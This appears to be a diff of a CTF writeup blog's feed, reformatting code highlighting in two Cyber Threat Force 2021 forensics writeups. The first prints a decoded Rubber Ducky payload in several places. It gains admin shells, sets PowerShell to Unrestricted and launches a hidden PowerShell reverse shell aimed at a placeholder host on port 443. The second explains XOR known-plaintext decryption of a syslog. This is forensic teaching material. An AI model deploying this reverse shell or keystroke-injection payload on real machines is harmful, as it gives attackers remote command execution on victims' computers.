@@ -2,139 +2,139 @@
 For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
 DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER ... Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c.</description><content>&lt;p>Note: I did not solve this challenge during the CTF, but my teammate &lt;a href="https://twitter.com/lukhooo">Lukho&lt;/a> did.&lt;/p>
 &lt;p>For this challenge, we were given an &lt;code>inject.bin&lt;/code> file, which contains an encoded &lt;a href="https://hak5.org/products/usb-rubber-ducky-deluxe">Rubber Ducky&lt;/a> payload. We can use the &lt;a href="https://ducktoolkit.com/encode">Duck Toolkit&lt;/a> to get back the original code:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>powershell Start-Process notepad -Verb runAsENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mDELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DOWNARROW
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DOWNARROW
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&amp;#39;ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>start-Process powershell.exe -windowstyle hidden &amp;#34;$env:TEMP\72794.ps1&amp;#34;ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$Report &amp;gt;&amp;gt; $fileSaveDir&amp;#39;/ComputerInfo.html&amp;#39;ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>function copy-ToZip($fileSaveDir){ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$srcdir = $fileSaveDirENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$zipFile = &amp;#39;C:\Windows\Temp\report.txt\Report.zip&amp;#39;ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>if(-not (test-path($zipFile))) {ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set-content $zipFile (&amp;#34;PK&amp;#34; + [char]5 + [char]6 + (&amp;#34;$([char]0)&amp;#34; * 18))ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(dir $zipFile).IsReadOnly = $false}ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$shellApplication = new-object -com shell.applicationENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$files = Get-ChildItem -Path $srcdirENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>foreach($file in $files) {ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$zipPackage.CopyHere($file.FullName)ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>while($zipPackage.Items().Item($file.name) -eq $null){ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Start-sleep -seconds 1 }}}ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>copy-ToZip($fileSaveDir)ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>remove-item $fileSaveDir -recurseENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Remove-Item $MyINvocation.InvocationNameENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>C:\Windows\config-72794.ps1ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>powershell Start-Process cmd -Verb runAsENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mode con:cols=14 lines=1ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mDELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DOWNARROW
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DOWNARROW
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>powershell Set-ExecutionPolicy &amp;#39;Unrestricted&amp;#39; -Scope CurrentUser -Confirm:$falseENTER
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DELAY
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>$c = New-Object System.Net.Sockets.TCPClient(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;&lt;/span>,443);$s = $c.GetStream();&lt;span style="color:#66d9ef">[byte[]]&lt;/span>$b = 0..255|%{0};&lt;span style="color:#66d9ef">while&lt;/span>(($i = $s.Read($b, 0, $b.Length)) &lt;span style="color:#f92672">-ne&lt;/span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &lt;span style="color:#e6db74">&amp;#34;PS &amp;#34;&lt;/span> + (pwd).Path + &lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>;$sby = (&lt;span style="color:#66d9ef">[text.encoding]&lt;/span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D0N4LD_DUC|&amp;lt;}&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-text" data-lang="text">DELAY
+DELAY
+powershell Start-Process notepad -Verb runAsENTER
+DELAY
+DELAY
+ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+$folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER
+...
+Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&amp;#39;ENTER
+start-Process powershell.exe -windowstyle hidden &amp;#34;$env:TEMP\72794.ps1&amp;#34;ENTER
+$Report &amp;gt;&amp;gt; $fileSaveDir&amp;#39;/ComputerInfo.html&amp;#39;ENTER
+function copy-ToZip($fileSaveDir){ENTER
+$srcdir = $fileSaveDirENTER
+$zipFile = &amp;#39;C:\Windows\Temp\report.txt\Report.zip&amp;#39;ENTER
+if(-not (test-path($zipFile))) {ENTER
+set-content $zipFile (&amp;#34;PK&amp;#34; + [char]5 + [char]6 + (&amp;#34;$([char]0)&amp;#34; * 18))ENTER
+(dir $zipFile).IsReadOnly = $false}ENTER
+$shellApplication = new-object -com shell.applicationENTER
+$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
+$files = Get-ChildItem -Path $srcdirENTER
+foreach($file in $files) {ENTER
+$zipPackage.CopyHere($file.FullName)ENTER
+while($zipPackage.Items().Item($file.name) -eq $null){ENTER
+Start-sleep -seconds 1 }}}ENTER
+copy-ToZip($fileSaveDir)ENTER
+remove-item $fileSaveDir -recurseENTER
+Remove-Item $MyINvocation.InvocationNameENTER
+DELAY
+C:\Windows\config-72794.ps1ENTER
+DELAY
+DELAY
+DELAY
+powershell Start-Process cmd -Verb runAsENTER
+DELAY
+DELAY
+mode con:cols=14 lines=1ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+powershell Set-ExecutionPolicy &amp;#39;Unrestricted&amp;#39; -Scope CurrentUser -Confirm:$falseENTER
+DELAY
+powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-powershell" data-lang="powershell">$c = New-Object System.Net.Sockets.TCPClient(&lt;span style="color:#e6db74">&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;&lt;/span>,443);$s = $c.GetStream();&lt;span style="color:#66d9ef">[byte[]]&lt;/span>$b = 0..255|%{0};&lt;span style="color:#66d9ef">while&lt;/span>(($i = $s.Read($b, 0, $b.Length)) &lt;span style="color:#f92672">-ne&lt;/span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String );$sb2 = $sb + &lt;span style="color:#e6db74">&amp;#34;PS &amp;#34;&lt;/span> + (pwd).Path + &lt;span style="color:#e6db74">&amp;#34;&amp;gt; &amp;#34;&lt;/span>;$sby = (&lt;span style="color:#66d9ef">[text.encoding]&lt;/span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The flag is &lt;code>CYBERTF{D0N4LD_DUC|&amp;lt;}&lt;/code>.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Usb key cemetery</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/</link><pubDate>Sun, 11 Jul 2021 09:09:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/</guid><description>Note: I did not solve this challenge during the CTF, but my teammate Volker did.
 For this challenge, we were given a zip containing an encoded syslog (sysloc.enc), and an auth.json file:
 { &amp;#34;manufact&amp;#34;: [ &amp;#34;Apple Inc.&amp;#34;, &amp;#34;Azurewave&amp;#34;, &amp;#34;Generic&amp;#34;, &amp;#34;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#34;, &amp;#34;usbrip-4381&amp;#34; ], &amp;#34;pid&amp;#34;: [ &amp;#34;0002&amp;#34;, &amp;#34;0003&amp;#34;, &amp;#34;0129&amp;#34;, &amp;#34;0608&amp;#34;, &amp;#34;12a8&amp;#34;, &amp;#34;3491&amp;#34;, &amp;#34;56dd&amp;#34;, &amp;#34;usbrip-4381&amp;#34; ], &amp;#34;prod&amp;#34;: [ &amp;#34;USB2.0 HD UVC WebCam&amp;#34;, &amp;#34;USB2.0 Hub&amp;#34;, &amp;#34;USB2.0-CRW&amp;#34;, &amp;#34;iPhone&amp;#34;, &amp;#34;usbrip-4381&amp;#34;, &amp;#34;xHCI Host Controller&amp;#34; ], &amp;#34;serial&amp;#34;: [ &amp;#34;0000:03:00.</description><content>&lt;p>Note: I did not solve this challenge during the CTF, but my teammate &lt;a href="https://twitter.com/volker_carstein">Volker&lt;/a> did.&lt;/p>
 &lt;p>For this challenge, we were given a zip containing an encoded syslog (&lt;code>sysloc.enc&lt;/code>), and an &lt;code>auth.json&lt;/code> file:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;manufact&amp;#34;&lt;/span>: [
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Apple Inc.&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Azurewave&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Generic&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;pid&amp;#34;&lt;/span>: [
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0002&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0003&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0129&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0608&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;12a8&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;3491&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;56dd&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;prod&amp;#34;&lt;/span>: [
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;USB2.0 HD UVC WebCam&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;USB2.0 Hub&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;USB2.0-CRW&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;iPhone&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;xHCI Host Controller&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;serial&amp;#34;&lt;/span>: [
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0000:03:00.3&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0000:03:00.4&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0x0001&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;20100201396000000&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;4b8d611f609abfc5471ae40d08d0c8b785eab9d4&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;vid&amp;#34;&lt;/span>: [
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;05ac&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;05e3&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;0bda&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;13d3&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;1d6b&amp;#34;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The goal of the challenge is to find the serial number of the rubber ducky which was connected to the machine for which we have the syslog.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ file syslog.enc
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syslog.enc: data
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file doesn&amp;rsquo;t look like any well known format, so we can assume (quite safely) that the encryption is a simple XOR. We&amp;rsquo;ll use &lt;a href="https://blog.didierstevens.com/2016/01/01/xor-known-plaintext-attack/">the known plaintext XOR tool from Didier Stevens&lt;/a>.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
+&lt;span style="color:#f92672">&amp;#34;manufact&amp;#34;&lt;/span>: [
+&lt;span style="color:#e6db74">&amp;#34;Apple Inc.&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;Azurewave&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;Generic&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
+],
+&lt;span style="color:#f92672">&amp;#34;pid&amp;#34;&lt;/span>: [
+&lt;span style="color:#e6db74">&amp;#34;0002&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0003&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0129&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0608&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;12a8&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;3491&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;56dd&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
+],
+&lt;span style="color:#f92672">&amp;#34;prod&amp;#34;&lt;/span>: [
+&lt;span style="color:#e6db74">&amp;#34;USB2.0 HD UVC WebCam&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;USB2.0 Hub&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;USB2.0-CRW&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;iPhone&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;xHCI Host Controller&amp;#34;&lt;/span>
+],
+&lt;span style="color:#f92672">&amp;#34;serial&amp;#34;&lt;/span>: [
+&lt;span style="color:#e6db74">&amp;#34;0000:03:00.3&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0000:03:00.4&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0x0001&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;20100201396000000&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;4b8d611f609abfc5471ae40d08d0c8b785eab9d4&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
+],
+&lt;span style="color:#f92672">&amp;#34;vid&amp;#34;&lt;/span>: [
+&lt;span style="color:#e6db74">&amp;#34;05ac&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;05e3&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;0bda&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;13d3&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;1d6b&amp;#34;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;usbrip-4381&amp;#34;&lt;/span>
+]
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The goal of the challenge is to find the serial number of the rubber ducky which was connected to the machine for which we have the syslog.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file syslog.enc
+syslog.enc: data
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file doesn&amp;rsquo;t look like any well known format, so we can assume (quite safely) that the encryption is a simple XOR. We&amp;rsquo;ll use &lt;a href="https://blog.didierstevens.com/2016/01/01/xor-known-plaintext-attack/">the known plaintext XOR tool from Didier Stevens&lt;/a>.&lt;/p>
 &lt;p>A good candidate for the plaintext is &lt;code>Linux 5.10.0-kali8-amd64 xhci-hcd&lt;/code>, which will surely appear.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python2 xor-kpa.py -d &amp;lt;&lt;span style="color:#f92672">(&lt;/span>echo &lt;span style="color:#e6db74">&amp;#39;Linux 5.10.0-kali8-amd64 xhci-hcd&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> syslog.enc &amp;gt; syslog
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ head -n &lt;span style="color:#ae81ff">5&lt;/span> syslog
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connecting to new device on location 0x10004 as ID &lt;span style="color:#ae81ff">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:25 kali usbmuxd&lt;span style="color:#f92672">[&lt;/span>117991&lt;span style="color:#f92672">]&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>22:53:25.287&lt;span style="color:#f92672">][&lt;/span>3&lt;span style="color:#f92672">]&lt;/span> Connected to v2.0 device &lt;span style="color:#ae81ff">1&lt;/span> on location 0x10004 with serial number 4b8d611f609abfc5471ae40d08d0c8b785eab9d4
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jun &lt;span style="color:#ae81ff">7&lt;/span> 22:53:27 kali ModemManager&lt;span style="color:#f92672">[&lt;/span>830&lt;span style="color:#f92672">]&lt;/span>: &amp;lt;info&amp;gt; &lt;span style="color:#f92672">[&lt;/span>base-manager&lt;span style="color:#f92672">]&lt;/span> couldn&lt;span style="color:#e6db74">&amp;#39;t check support for device &amp;#39;&lt;/span>/sys/devices/pci0000:00/0000:00:08.1/0000:03:00.3/usb1/1-2&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>: not supported by any plugin
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:16 kali lynis&lt;span style="color:#f92672">[&lt;/span>144261&lt;span style="color:#f92672">]&lt;/span>: - usbmuxd.service: &lt;span style="color:#f92672">[&lt;/span> UNSAFE &lt;span style="color:#f92672">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Jun &lt;span style="color:#ae81ff">8&lt;/span> 00:16:22 kali lynis&lt;span style="color:#f92672">[&lt;/span>118776&lt;span style="color:#f92672">]&lt;/span>: - Checking usb-storage driver &lt;span style="color:#f92672">(&lt;/span>modprobe config&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[&lt;/span> NON DESACTIVÉ &lt;span style="color:#f92672">]&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That seems like a valid syslog! After looking for a short while, we find:&lt;/p>
-&lt;pre tabindex="0">&lt;code>Apr 12 20:21:25 kali kernel: [ 1.830063] usb 1-2: Product: Fake_KeyBoard
